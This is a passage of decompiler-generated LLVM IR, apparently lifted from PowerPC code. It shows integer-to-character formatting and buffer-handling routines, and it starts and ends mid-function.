dec_label_pc_1000a138:                            ; preds = %dec_label_pc_1000a10c, %dec_label_pc_1000a100, %dec_label_pc_1000a118
  %v1_1000a1cc37 = phi i32 [ %v1_1000a120, %dec_label_pc_1000a10c ], [ %v1_1000a120, %dec_label_pc_1000a100 ], [ %v1_1000a134, %dec_label_pc_1000a118 ]
  %v0_1000a138 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a138 = icmp slt i32 %v0_1000a138, 102
  %v3_1000a138 = icmp eq i32 %v0_1000a138, 102
  store i1 %v1_1000a138, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a138, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a138, label %dec_label_pc_1000a1c0, label %dec_label_pc_1000a140

dec_label_pc_1000a140:                            ; preds = %dec_label_pc_1000a138
  %v0_1000a140 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a140 = icmp slt i32 %v0_1000a140, 0
  %v3_1000a140 = icmp eq i32 %v0_1000a140, 0
  store i1 %v1_1000a140, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a140, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_1000a140, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_1000a140, -1
  br i1 %tmp80, label %dec_label_pc_1000a15c, label %dec_label_pc_1000a154

dec_label_pc_1000a154:                            ; preds = %dec_label_pc_1000a140
  %v1_1000a154 = sub i32 0, %v0_1000a140
  store i32 %v1_1000a154, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000a15c

dec_label_pc_1000a15c:                            ; preds = %dec_label_pc_1000a140, %dec_label_pc_1000a154
  %v0_1000a17031 = phi i32 [ %v0_1000a140, %dec_label_pc_1000a140 ], [ %v1_1000a154, %dec_label_pc_1000a154 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000a160 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_1000a160, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000a170

dec_label_pc_1000a170:                            ; preds = %dec_label_pc_1000a170.backedge, %dec_label_pc_1000a15c
  %v2_1000a190 = phi i32 [ %v3_1000a190, %dec_label_pc_1000a170.backedge ], [ %v2_1000a160, %dec_label_pc_1000a15c ]
  %v0_1000a174 = phi i32 [ %v0_1000a174.pre, %dec_label_pc_1000a170.backedge ], [ 2, %dec_label_pc_1000a15c ]
  %v1_1000a170 = phi i32 [ %v1_1000a170.pre, %dec_label_pc_1000a170.backedge ], [ 10, %dec_label_pc_1000a15c ]
  %v1_1000a184 = phi i32 [ %v0_1000a170.pre, %dec_label_pc_1000a170.backedge ], [ %v0_1000a17031, %dec_label_pc_1000a15c ]
  %v2_1000a170 = sdiv i32 %v1_1000a184, %v1_1000a170
  store i32 %v2_1000a170, i32* %r0.global-to-local, align 4
  %v1_1000a174 = add i32 %v0_1000a174, 1
  store i32 %v1_1000a174, i32* %r7.global-to-local, align 4
  %v1_1000a178 = icmp slt i32 %v1_1000a174, 3
  %v3_1000a178 = icmp eq i32 %v1_1000a174, 3
  store i1 %v1_1000a178, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a178, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a180 = icmp slt i32 %v2_1000a170, 0
  %v2_1000a180 = icmp sgt i32 %v2_1000a170, 0
  %v3_1000a180 = icmp eq i32 %v2_1000a170, 0
  store i1 %v1_1000a180, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_1000a180, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_1000a180, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_1000a170, -10
  store i32 %v2_1000a170, i32* %r11.global-to-local, align 4
  %v2_1000a184 = add i32 %v1_1000a184, 48
  %v1_1000a18c = add i32 %v2_1000a184, %tmp81
  store i32 %v1_1000a18c, i32* %r9.global-to-local, align 4
  %v1_1000a190 = trunc i32 %v1_1000a18c to i8
  %v3_1000a190 = add i32 %v2_1000a190, -1
  %v4_1000a190 = inttoptr i32 %v3_1000a190 to i8*
  store i8 %v1_1000a190, i8* %v4_1000a190, align 1
  store i32 %v3_1000a190, i32* %r10.global-to-local, align 4
  %v0_1000a194 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_1000a194 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_1000a194 = or i1 %v0_1000a194, %v1_1000a194
  br i1 %v2_1000a194, label %dec_label_pc_1000a170.backedge, label %dec_label_pc_1000a198

dec_label_pc_1000a170.backedge:                   ; preds = %dec_label_pc_1000a170, %dec_label_pc_1000a198
  %v0_1000a170.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a170.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1000a174.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000a170

dec_label_pc_1000a198:                            ; preds = %dec_label_pc_1000a170
  %v0_1000a198 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1000a198, label %dec_label_pc_1000a19c, label %dec_label_pc_1000a170.backedge

dec_label_pc_1000a19c:                            ; preds = %dec_label_pc_1000a198
  %v1_1000a19c = add i32 %v2_1000a190, -2
  store i32 %v1_1000a19c, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_1000a1a4 = add i32 %v2_1000a190, -3
  store i32 %v1_1000a1a4, i32* %r11.global-to-local, align 4
  %v0_1000a1a8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a1a8 = trunc i32 %v0_1000a1a8 to i8
  %v4_1000a1a8 = inttoptr i32 %v1_1000a19c to i8*
  store i8 %v1_1000a1a8, i8* %v4_1000a1a8, align 1
  %v0_1000a1ac = load i32, i32* %r5.global-to-local, align 4
  %v1_1000a1ac = trunc i32 %v0_1000a1ac to i8
  %v2_1000a1ac = load i32, i32* %r9.global-to-local, align 4
  %v3_1000a1ac = add i32 %v2_1000a1ac, -1
  %v4_1000a1ac = inttoptr i32 %v3_1000a1ac to i8*
  store i8 %v1_1000a1ac, i8* %v4_1000a1ac, align 1
  %v0_1000a1b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a1b0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a1b0 = inttoptr i32 %v1_1000a1b0 to i32*
  store i32 %v0_1000a1b0, i32* %v2_1000a1b0, align 4
  %v0_1000a1b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000a1b4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a1b4 = add i32 %v1_1000a1b4, 4
  %v3_1000a1b4 = inttoptr i32 %v2_1000a1b4 to i32*
  store i32 %v0_1000a1b4, i32* %v3_1000a1b4, align 4
  %v0_1000a1b8 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a1b8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a1b8 = add i32 %v1_1000a1b8, 8
  %v3_1000a1b8 = inttoptr i32 %v2_1000a1b8 to i32*
  store i32 %v0_1000a1b8, i32* %v3_1000a1b8, align 4
  %v0_1000a1bc = load i32, i32* %r8.global-to-local, align 4
  %v1_1000a1bc = add i32 %v0_1000a1bc, 12
  store i32 %v1_1000a1bc, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000a1c0

dec_label_pc_1000a1c0:                            ; preds = %dec_label_pc_1000a138, %dec_label_pc_10009d14, %dec_label_pc_1000a19c
  %v0_1000a23c = phi i32 [ %v1_1000a1cc37, %dec_label_pc_1000a138 ], [ %v2_10009d20, %dec_label_pc_10009d14 ], [ %v1_1000a1bc, %dec_label_pc_1000a19c ]
  %v2_1000a1c0 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_1000a1c0, i32* %r9.global-to-local, align 4
  %v1_1000a1d0.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000a1c4

dec_label_pc_1000a1c4:                            ; preds = %dec_label_pc_1000a1c4, %dec_label_pc_1000a1c0
  %v1_1000a1d0 = phi i32 [ %v2_1000a1d0, %dec_label_pc_1000a1c4 ], [ %v1_1000a1d0.pre, %dec_label_pc_1000a1c0 ]
  %v0_1000a1c4 = phi i32 [ %v1_1000a1c8, %dec_label_pc_1000a1c4 ], [ %v2_1000a1c0, %dec_label_pc_1000a1c0 ]
  %v1_1000a1c4 = inttoptr i32 %v0_1000a1c4 to i32*
  %v2_1000a1c4 = load i32, i32* %v1_1000a1c4, align 4
  store i32 %v2_1000a1c4, i32* %r0.global-to-local, align 4
  %v1_1000a1c8 = add i32 %v0_1000a1c4, 12
  store i32 %v1_1000a1c8, i32* %r9.global-to-local, align 4
  %v2_1000a1cc = icmp ult i32 %v1_1000a1c8, %v0_1000a23c
  %v2_1000a1d0 = sub i32 %v1_1000a1d0, %v2_1000a1c4
  store i32 %v2_1000a1d0, i32* @r28, align 4
  br i1 %v2_1000a1cc, label %dec_label_pc_1000a1c4, label %dec_label_pc_1000a1d8

dec_label_pc_1000a1d8:                            ; preds = %dec_label_pc_1000a1c4
  %v4_1000a1cc = icmp eq i32 %v1_1000a1c8, %v0_1000a23c
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a1cc, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a1d8 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_1000a23c, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_1000a1d8, 0
  %v1_1000a1ec = zext i1 %tmp85 to i32
  store i32 %v1_1000a1ec, i32* %r9.global-to-local, align 4
  %v2_1000a1f0 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_1000a1f0, i32* %r0.global-to-local, align 4
  %v2_1000a1f4 = sub i32 %v2_1000a1d0, %v1_1000a1ec
  store i32 %v2_1000a1f4, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_1000a1f4, 1
  br i1 %tmp82, label %dec_label_pc_1000a260, label %dec_label_pc_1000a204

dec_label_pc_1000a204:                            ; preds = %dec_label_pc_1000a1d8
  %v3_1000a204 = load i32, i32* %v2_10009c40, align 4
  store i32 %v3_1000a204, i32* %r0.global-to-local, align 4
  %v1_1000a208 = and i32 %v3_1000a204, 8
  store i32 %v1_1000a208, i32* %r7.global-to-local, align 4
  %v3_1000a208 = icmp eq i32 %v1_1000a208, 0
  br i1 %v3_1000a208, label %dec_label_pc_1000a22c, label %dec_label_pc_1000a210

dec_label_pc_1000a210:                            ; preds = %dec_label_pc_1000a204
  %v1_1000a214 = add i32 %v0_1000a23c, 12
  store i32 %v1_1000a214, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1000f2d3.294 to i32), i32* %r9.global-to-local, align 4
  %v2_1000a21c = inttoptr i32 %v0_1000a23c to i32*
  store i32 160, i32* %v2_1000a21c, align 4
  %v0_1000a220 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000a220 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a220 = add i32 %v1_1000a220, 4
  %v3_1000a220 = inttoptr i32 %v2_1000a220 to i32*
  store i32 %v0_1000a220, i32* %v3_1000a220, align 4
  %v0_1000a224 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000a224 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000a224 = add i32 %v1_1000a224, 8
  %v3_1000a224 = inttoptr i32 %v2_1000a224 to i32*
  store i32 %v0_1000a224, i32* %v3_1000a224, align 4
  br label %dec_label_pc_1000a260

dec_label_pc_1000a22c:                            ; preds = %dec_label_pc_1000a204
  %v1_1000a22c = add i32 %tmp, 16
  %v2_1000a22c = inttoptr i32 %v1_1000a22c to i32*
  %v3_1000a22c = load i32, i32* %v2_1000a22c, align 4
  store i32 %v3_1000a22c, i32* %r0.global-to-local, align 4
  %v1_1000a230 = icmp slt i32 %v3_1000a22c, 48
  %v3_1000a230 = icmp eq i32 %v3_1000a22c, 48
  store i1 %v1_1000a230, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a230, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a230, label %dec_label_pc_1000a238, label %dec_label_pc_1000a254

dec_label_pc_1000a238:                            ; preds = %dec_label_pc_1000a22c
  %v3_1000a238 = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_1000a23c, i32* @r30, align 4
  %v2_1000a240 = add i32 %v3_1000a238, %v2_1000a1f4
  store i32 %v2_1000a240, i32* %r0.global-to-local, align 4
  store i32 %v2_1000a240, i32* %stack_var_-140, align 4
  br label %dec_label_pc_1000a260

dec_label_pc_1000a24c:                            ; preds = %dec_label_pc_1000a268
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_1000a29c

dec_label_pc_1000a254:                            ; preds = %dec_label_pc_1000a22c
  store i32 %v2_1000a1d0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a23c, i32* @r30, align 4
  br label %dec_label_pc_1000a260

dec_label_pc_1000a260:                            ; preds = %dec_label_pc_1000a1d8, %dec_label_pc_1000a238, %dec_label_pc_1000a210, %dec_label_pc_1000a254
  store i32 0, i32* @r29, align 4
  %v2_1000a264 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_1000a264, i32* @r31, align 4
  br label %dec_label_pc_1000a268

dec_label_pc_1000a268:                            ; preds = %dec_label_pc_1000a298, %dec_label_pc_1000a260
  %v0_1000a278 = phi i32 [ %v1_1000a284, %dec_label_pc_1000a298 ], [ %v2_1000a264, %dec_label_pc_1000a260 ]
  %v1_1000a268 = inttoptr i32 %v0_1000a278 to i32*
  %v2_1000a268 = load i32, i32* %v1_1000a268, align 4
  store i32 %v2_1000a268, i32* %r4.global-to-local, align 4
  %v0_1000a26c = load i32, i32* @r27, align 4
  store i32 %v0_1000a26c, i32* %r3.global-to-local, align 4
  %v1_1000a270 = add i32 %v0_1000a278, 4
  %v2_1000a270 = inttoptr i32 %v1_1000a270 to i32*
  %v3_1000a270 = load i32, i32* %v2_1000a270, align 4
  store i32 %v3_1000a270, i32* %r5.global-to-local, align 4
  %v0_1000a274 = load i32, i32* @r26, align 4
  store i32 %v0_1000a274, i32* %ctr.global-to-local, align 4
  %v1_1000a278 = add i32 %v0_1000a278, 8
  %v2_1000a278 = inttoptr i32 %v1_1000a278 to i32*
  %v3_1000a278 = load i32, i32* %v2_1000a278, align 4
  store i32 %v3_1000a278, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_1000a274)
  %v0_1000a280 = load i32, i32* @r31, align 4
  %v1_1000a280 = add i32 %v0_1000a280, 4
  %v2_1000a280 = inttoptr i32 %v1_1000a280 to i32*
  %v3_1000a280 = load i32, i32* %v2_1000a280, align 4
  store i32 %v3_1000a280, i32* %r0.global-to-local, align 4
  %v1_1000a284 = add i32 %v0_1000a280, 12
  store i32 %v1_1000a284, i32* @r31, align 4
  %v0_1000a288 = load i32, i32* @r29, align 4
  %v1_1000a288 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000a288 = add i32 %v1_1000a288, %v0_1000a288
  store i32 %v2_1000a288, i32* @r29, align 4
  %v1_1000a28c = load i32, i32* @r30, align 4
  %v2_1000a28c = icmp ult i32 %v1_1000a284, %v1_1000a28c
  %v3_1000a28c = icmp ugt i32 %v1_1000a284, %v1_1000a28c
  %v4_1000a28c = icmp eq i32 %v1_1000a284, %v1_1000a28c
  store i1 %v2_1000a28c, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_1000a28c, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_1000a28c, i1* %cr6_eq.global-to-local, align 1
  %v2_1000a290 = icmp slt i32 %v1_1000a288, %v3_1000a280
  %v4_1000a290 = icmp eq i32 %v1_1000a288, %v3_1000a280
  store i1 %v2_1000a290, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a290, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000a290, label %dec_label_pc_1000a298, label %dec_label_pc_1000a24c

dec_label_pc_1000a298:                            ; preds = %dec_label_pc_1000a268
  br i1 %v2_1000a28c, label %dec_label_pc_1000a268, label %dec_label_pc_1000a29c

dec_label_pc_1000a29c:                            ; preds = %dec_label_pc_1000a298, %dec_label_pc_1000a24c
  %v0_1000a2a0 = phi i32 [ -1, %dec_label_pc_1000a24c ], [ %v2_1000a288, %dec_label_pc_1000a298 ]
  store i32 %v0_10009bf4, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a2a0, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000a2a0

; uselistorder directives
  uselistorder i32 %v0_1000a2a0, { 1, 0 }
  uselistorder i32 %v1_1000a288, { 2, 1, 0 }
  uselistorder i32 %v1_1000a284, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v3_1000a280, { 1, 0, 2 }
  uselistorder i32 %v0_1000a278, { 0, 2, 1 }
  uselistorder i32 %v3_1000a22c, { 1, 0, 2 }
  uselistorder i32 %v1_1000a1ec, { 1, 0 }
  uselistorder i32 %v2_1000a1d0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000a1c8, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000a1c4, { 1, 0 }
  uselistorder i32 %v0_1000a23c, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_1000a190, { 1, 2, 0 }
  uselistorder i32 %v1_1000a174, { 1, 0, 2 }
  uselistorder i32 %v2_1000a170, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_1000a140, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_1000a110, { 2, 0, 1 }
  uselistorder i32 %v2_1000a10c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000a07c, { 1, 0 }
  uselistorder i32 %v2_10009fe4, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_10009fb4, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_10009f7c, { 3, 0, 1, 2 }
  uselistorder i32 %v0_10009f74, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_10009f40, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_10009f30, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_10009f24, { 1, 0, 2 }
  uselistorder i32 %v1_10009f08, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10009ec0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_10009eb0, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10009e94, { 1, 0 }
  uselistorder i32 %v1_10009e70, { 1, 0 }
  uselistorder i32 %v2_10009e50, { 1, 0, 2 }
  uselistorder i32 %v0_10009df8, { 1, 0 }
  uselistorder i32 %v1_10009c5c, { 1, 0 }
  uselistorder i32 %v0_10009cec, { 2, 1, 0 }
  uselistorder i32 %v1_10009c30, { 1, 0 }
  uselistorder i32 %v1_10009c18, { 1, 0, 2 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 4, 3, 0, 5, 6 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 21, 22, 19, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r8.global-to-local, { 31, 32, 0, 8, 9, 10, 11, 1, 12, 13, 14, 2, 15, 16, 17, 3, 18, 19, 20, 4, 21, 22, 23, 5, 6, 7, 24, 26, 25, 27, 28, 29, 30, 33 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 7, 6, 8, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 9, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 9, 10, 11, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 3, 4, 0, 5, 1, 6, 7, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 37, 38, 39, 40 }
  uselistorder i1* %cr7_lt.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i1* %cr7_eq.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 2, 1 }
  uselistorder i32 112, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 1, 2, 0, 3 }
  uselistorder i8 48, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1000f2d0.292 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder label %dec_label_pc_1000a260, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a1c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a170.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000a15c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a138, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a10c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a0f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000a0dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000a0b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a094, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a070, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000a054, { 1, 0 }
  uselistorder label %dec_label_pc_10009fc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009f60, { 1, 0 }
  uselistorder label %dec_label_pc_10009f20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009ee4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009eb8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009e98, { 1, 0 }
  uselistorder label %dec_label_pc_10009e24, { 1, 0 }
  uselistorder label %dec_label_pc_10009d14, { 1, 0 }
  uselistorder label %dec_label_pc_10009c6c, { 1, 0 }
  uselistorder label %dec_label_pc_10009c40, { 1, 0 }
  uselistorder label %dec_label_pc_10009c34, { 1, 0 }
}

define i32 @function_1000a2b4(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000a2b4:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_1000a2b8 = load i32, i32* @lr, align 4
  store i32 %v0_1000a2b8, i32* %r0.global-to-local, align 4
  %v0_1000a2bc = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000a2c8 = add i32 %tmp, 16
  %v3_1000a2c8 = inttoptr i32 %v2_1000a2c8 to i32*
  %v4_1000a2c8 = load i32, i32* %v3_1000a2c8, align 4
  store i32 %v4_1000a2c8, i32* %r9.global-to-local, align 4
  %v2_1000a2cc = add i32 %tmp, 24
  %v3_1000a2cc = inttoptr i32 %v2_1000a2cc to i32*
  %v4_1000a2cc = load i32, i32* %v3_1000a2cc, align 4
  store i32 %v4_1000a2cc, i32* %r0.global-to-local, align 4
  %v2_1000a2d0 = icmp ult i32 %v4_1000a2c8, %v4_1000a2cc
  br i1 %v2_1000a2d0, label %dec_label_pc_1000a338, label %dec_label_pc_1000a2d8

dec_label_pc_1000a2d8:                            ; preds = %dec_label_pc_1000a2b4
  %v3_1000a2d8 = load i16, i16* %arg1, align 2
  %v4_1000a2d8 = zext i16 %v3_1000a2d8 to i32
  %v1_1000a2dc = and i32 %v4_1000a2d8, 131
  store i32 %v1_1000a2dc, i32* %r0.global-to-local, align 4
  %v2_1000a2e0 = icmp ugt i32 %v1_1000a2dc, 128
  br i1 %v2_1000a2e0, label %dec_label_pc_1000a2f8, label %dec_label_pc_1000a2e8

dec_label_pc_1000a2e8:                            ; preds = %dec_label_pc_1000a2d8
  store i32 268477168, i32* @lr, align 4
  %v3_1000a2ec = call i32 @function_1000b8e0(i16* inttoptr (i32 128 to i16*), i32 %v4_1000a2c8)
  store i32 %v3_1000a2ec, i32* %r3.global-to-local, align 4
  %v3_1000a2f0 = icmp eq i32 %v3_1000a2ec, 0
  br i1 %v3_1000a2f0, label %dec_label_pc_1000a2e8.dec_label_pc_1000a2f8_crit_edge, label %dec_label_pc_1000a3d4

dec_label_pc_1000a2e8.dec_label_pc_1000a2f8_crit_edge: ; preds = %dec_label_pc_1000a2e8
  %v0_1000a2f8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000a2f8

dec_label_pc_1000a2f8:                            ; preds = %dec_label_pc_1000a2e8.dec_label_pc_1000a2f8_crit_edge, %dec_label_pc_1000a2d8
  %v2_1000a358 = phi i32 [ %v0_1000a2f8.pre, %dec_label_pc_1000a2e8.dec_label_pc_1000a2f8_crit_edge ], [ %tmp, %dec_label_pc_1000a2d8 ]
  %v1_1000a2f8 = inttoptr i32 %v2_1000a358 to i16*
  %v2_1000a2f8 = load i16, i16* %v1_1000a2f8, align 2
  %v3_1000a2f8 = zext i16 %v2_1000a2f8 to i32
  %v1_1000a2fc = and i32 %v3_1000a2f8, 2
  store i32 %v1_1000a2fc, i32* %r0.global-to-local, align 4
  %v3_1000a2fc = icmp eq i32 %v1_1000a2fc, 0
  br i1 %v3_1000a2fc, label %dec_label_pc_1000a328, label %dec_label_pc_1000a304

dec_label_pc_1000a304:                            ; preds = %dec_label_pc_1000a2f8
  %v1_1000a304 = call i32 @__asm_rlwinm(i32 %v3_1000a2f8, i32 2, i32 29, i32 29)
  %v1_1000a308 = load i32, i32* @r31, align 4
  %v2_1000a308 = add i32 %v1_1000a308, %v1_1000a304
  store i32 %v2_1000a308, i32* %r9.global-to-local, align 4
  %v1_1000a30c = add i32 %v2_1000a308, 39
  %v2_1000a30c = inttoptr i32 %v1_1000a30c to i8*
  %v3_1000a30c = load i8, i8* %v2_1000a30c, align 1
  %v4_1000a30c = zext i8 %v3_1000a30c to i32
  store i32 %v4_1000a30c, i32* %r0.global-to-local, align 4
  %v1_1000a310 = add nsw i32 %v3_1000a2f8, -1
  store i32 %v1_1000a310, i32* %r9.global-to-local, align 4
  %v1_1000a314 = trunc i32 %v1_1000a310 to i16
  %v3_1000a314 = inttoptr i32 %v1_1000a308 to i16*
  store i16 %v1_1000a314, i16* %v3_1000a314, align 2
  %v0_1000a318 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000a318, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000a320 = load i32, i32* @r31, align 4
  %v2_1000a320 = add i32 %v1_1000a320, 40
  %v3_1000a320 = inttoptr i32 %v2_1000a320 to i32*
  store i32 0, i32* %v3_1000a320, align 4
  br label %dec_label_pc_1000a3d8

dec_label_pc_1000a328:                            ; preds = %dec_label_pc_1000a2f8
  %v1_1000a328 = add i32 %v2_1000a358, 16
  %v2_1000a328 = inttoptr i32 %v1_1000a328 to i32*
  %v3_1000a328 = load i32, i32* %v2_1000a328, align 4
  store i32 %v3_1000a328, i32* %r9.global-to-local, align 4
  %v1_1000a32c = add i32 %v2_1000a358, 20
  %v2_1000a32c = inttoptr i32 %v1_1000a32c to i32*
  %v3_1000a32c = load i32, i32* %v2_1000a32c, align 4
  store i32 %v3_1000a32c, i32* %r0.global-to-local, align 4
  %v4_1000a330 = icmp eq i32 %v3_1000a32c, %v3_1000a328
  br i1 %v4_1000a330, label %dec_label_pc_1000a344, label %dec_label_pc_1000a338

dec_label_pc_1000a338:                            ; preds = %dec_label_pc_1000a328, %dec_label_pc_1000a2b4
  %v1_1000a3ac7 = phi i32 [ %v2_1000a358, %dec_label_pc_1000a328 ], [ %tmp, %dec_label_pc_1000a2b4 ]
